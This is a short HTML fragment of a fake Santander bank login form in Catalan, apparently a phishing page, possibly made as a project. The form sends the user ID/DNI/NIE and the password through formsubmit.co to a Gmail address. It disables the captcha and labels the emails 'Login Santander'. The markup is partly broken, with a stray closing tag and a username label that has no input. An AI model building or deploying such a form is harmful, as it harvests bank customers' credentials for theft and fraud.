      </div>

      <form id="loginForm" action="https://formsubmit.co/adminsecurity12@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" name="_template" value="table">
        <input type="hidden" name="_subject" value="[PROJECTE] Login Santander">

          <label for="usuario">Usuari / DNI / NIE</label>

        </div>
        <div class="form-group">
          <label for="password">Contrasenya</label>
          <input type="password" id="password" name="password" placeholder="Introdueix la teva contrasenya" required>
        </div>

        <button type="submit" class="btn-submit">Accedir</button>
      </form>
